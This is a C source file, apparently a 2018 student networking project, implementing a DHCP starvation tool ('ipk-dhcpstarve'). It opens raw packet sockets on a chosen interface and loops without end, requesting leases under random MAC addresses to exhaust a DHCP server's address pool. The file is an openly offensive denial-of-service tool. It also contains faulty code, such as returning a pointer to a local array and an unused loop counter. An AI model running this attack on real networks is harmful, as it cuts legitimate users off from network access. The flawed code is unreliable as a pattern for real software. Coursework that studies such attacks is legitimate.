/**
 * IPK 2. project
 * @date 28.03.2018
 * @author Alena Tesarova
 *
 */


#include "headers.h"
#include "dhcp.h"
//#include "leases.h"

#define MAX_TRIES 2

unsigned char ifmac[6];
/**
* close_socket
* function closes socket
* @param socket
*/
int close_socket(int sock)
{
    close(sock);
    return EXIT_SUCCESS;
}

/**
* generate_mac_addr
* Function generates random mac address
*/
unsigned char * generate_mac_addr()
{
    unsigned char new_mac_addr[MAC_ADDRESS_L];
    for( int i = 0; i < MAC_ADDRESS_L; i ++)
    {
        // number cant be above 15 in hexadecimal, 255 in descimal
        unsigned int rand_number = rand() % 255 + 1;
        new_mac_addr[i] = rand_number;
    }
    printf("New Random Mac : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , new_mac_addr[0], new_mac_addr[1], new_mac_addr[2], new_mac_addr[3], new_mac_addr[4], new_mac_addr[5] );
    return new_mac_addr;

}

int main ( int argc, char *argv[] )
{
    /// inicialized random generator

    srand( time(NULL) );

    // enter: ./ipk-dhcpstarve -i interface
    // interface: name of interface to generate attack
    if ( argc != 3 )
    {
        fprintf(stderr, "Bad number of arguments");
        return(EXIT_FAILURE);
    }
    if ( strcmp( argv[ 1 ], "-i" ) != 0 )
    {
        fprintf(stderr, "Bad number of arguments");
        return(EXIT_FAILURE);
    }
    char interfacename[50];
    strncpy( interfacename, argv[2], sizeof( interfacename ) );
    printf( "Interface is: %s\n", interfacename );

    // crete sockets to send and receive data
    int socket_recv = -1;
    int socket_send = -1;

    /* RECEIVE SOCKET */

    // soket on UDP
    if (( socket_recv = socket( PF_PACKET, SOCK_DGRAM, htons( ETH_P_IP ) ) ) <= 0 )
    {
        perror("Can not create recv socket\n");
        return ( EXIT_FAILURE );

    }

    // set options to receive socket
    int sockopt = 1;
    if ( setsockopt( socket_recv, SOL_SOCKET, SO_BROADCAST, &sockopt, sizeof( sockopt ) ) != 0 )
    {
        perror("Can not set any options to receive socket\n");
        return (EXIT_FAILURE);
    }
    /* SENDING SOCKET */
    // raw netword protocol access
    if ( ( socket_send  = socket( PF_PACKET, SOCK_RAW, htons( ETH_P_ALL ) ) ) == -1 )
    {
        perror ( "Can not create send socket\n" );
        return( EXIT_FAILURE );
    }
    // options for send socket
    sockopt = 1;
    if ( ( setsockopt( socket_send, SOL_SOCKET, SO_BROADCAST, &sockopt, sizeof( sockopt )  ) ) != 0 )
    {
        perror(  "Can not not set any options to socket\n");
        return(EXIT_FAILURE);
    }


    // get network interface index which name is in interfacename
    // socket must contain packet socket descriptor
    /*
       struct ifreq {
       char ifr_name[IFNAMSIZ]; innterface name
    union {
    	struct sockaddr ifr_addr;
    	struct sockaddr ifr_dstaddr;
    	struct sockaddr ifr_broadaddr;
    	struct sockaddr ifr_netmask;
    	struct sockaddr ifr_hwaddr;
    	short           ifr_flags;
    	int             ifr_ifindex;
    	int             ifr_metric;
    	int             ifr_mtu;
    	struct ifmap    ifr_map;
    	char            ifr_slave[IFNAMSIZ];
    	char            ifr_newname[IFNAMSIZ];
    	char           *ifr_data;
    };
    }
     */
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy( ifr.ifr_name, interfacename, sizeof( ifr.ifr_name ) );

    // we need destination mac address
    if ( ioctl( socket_send, SIOCGIFHWADDR, &ifr ) == -1 )
    {
        fprintf(stderr, "ioctl error\n");
        return( EXIT_FAILURE );
    }
    memcpy( ifmac, ifr.ifr_hwaddr.sa_data, ETH_ALEN );
    printf("interface: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , ifmac[0], ifmac[1], ifmac[2], ifmac[3], ifmac[4], ifmac[5] );

    //memset(&ifr, 0, sizeof(ifr));
    //strncpy( ifr.ifr_name, interfacename, sizeof( ifr.ifr_name ) );

    if ( ioctl( socket_send, SIOCGIFINDEX, &ifr ) == -1 )
    {
        fprintf( stderr, "ioctl error\n" );
        return( EXIT_FAILURE );
    }
    //index je v ifr.ifr_ifindex
    printf("Index of interface: %d\n", ifr.ifr_ifindex);

    // mac adresa v ifr.ifr_hwaddr.sa_data (unsigned char *)
    unsigned char destmac[] = {0xff, 0xff, 0xff, 0xff,0xff, 0xff};
    int interface_index = ifr.ifr_ifindex;
    //printf("Mac desc: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , destmac[0], destmac[1], destmac[2], destmac[3], destmac[4], destmac[5] );
    //printf("Index is: %d\n", interface_index );

    int poc = 5;
    while(1)
    {
        poc--;

        /* list of leases
        need to send a DHCPDISCOVER packet with reqiest of IP addr
        reply to out request i s a DHCOFFER with offer if IP addr, client can choose one IP addr
        and request for the addr with DHCPREQUEST packet
        server returns DHCPACK as a reply
        */

        // generate mac address

        unsigned char *mac = generate_mac_addr();
        //memcpy( ifmac, mac, ETH_ALEN );
        printf("Mac : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5] );

        // request lease
        request_lease(socket_send, socket_recv, generate_mac_addr(), 2, interface_index );
        printf("request done\n");


        // we not successful, brak while
    }
    // end


    return 0;

}
